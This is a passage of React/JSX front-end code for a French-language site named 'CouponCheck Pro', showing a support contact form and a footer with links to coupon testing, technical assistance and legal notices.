                <div className="space-y-1.5 flex flex-col">
                  <label htmlFor="message" className="text-xs font-bold text-slate-600 uppercase tracking-wide">
                    Votre message détaillé : <span className="text-red-500">*</span>
                  </label>
                  <textarea
                    id="message"
                    name="message"
                    required
                    rows={8}
                    value={contactMessage}
                    onChange={(e) => setContactMessage(e.target.value)}
                    placeholder=""
                    className="bg-white text-slate-900 p-4 rounded-xl border border-sky-200 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500/30 outline-none text-sm transition font-medium resize-none"
                  />
                </div>

                {/* SUBMIT BUTTON */}
                <button
                  type="submit"
                  disabled={isSendingContact}
                  className="w-full py-4 bg-gradient-to-r from-indigo-500 to-pink-500 text-white text-sm font-extrabold rounded-xl hover:shadow-xl hover:shadow-indigo-500/20 active:scale-95 transition flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50 font-sans"
                >
                  {isSendingContact ? (
                    <>
                      <RefreshCw className="w-4 h-4 animate-spin" />
                      Transmission en cours...
                    </>
                  ) : (
                    <>
                      <Send className="w-4 h-4" />
                      Envoyer le message au support
                    </>
                  )}
                </button>
              </form>

            </div>
          </section>
        </div>
      )}

      {/* ===== FOOTER ===== */}
      <footer className="mt-auto bg-white/80 border-t border-sky-200/60 shadow-inner py-12 px-6">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-6">
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 rounded bg-gradient-to-tr from-indigo-500 to-pink-500 flex items-center justify-center font-bold text-sm text-white">
              C
            </div>
            <div>
              <span className="text-sm font-extrabold text-slate-900">CouponCheck Pro</span>
              <p className="text-[11px] text-slate-500">
                © {new Date().getFullYear()} CouponCheck Pro Labs. Modèle d'évaluation et de validation de recharges.
              </p>
            </div>
          </div>

          <div className="flex gap-4 text-xs text-slate-500">
            <span className="hover:text-slate-800 cursor-pointer transition font-semibold" onClick={() => changePage("verification")}>Test de Coupon</span>
            <span>•</span>
            <span className="hover:text-slate-800 cursor-pointer transition font-semibold" onClick={() => changePage("contact")}>Assistance technique</span>
            <span>•</span>
            <span className="hover:text-slate-800 cursor-pointer transition font-semibold" onClick={() => changePage("accueil")}>Mentions Légales</span>
          </div>
        </div>
      </footer>

      </div> {/* END OF MAIN CONTENT AREA wrapper */}

    </div>
  );
}
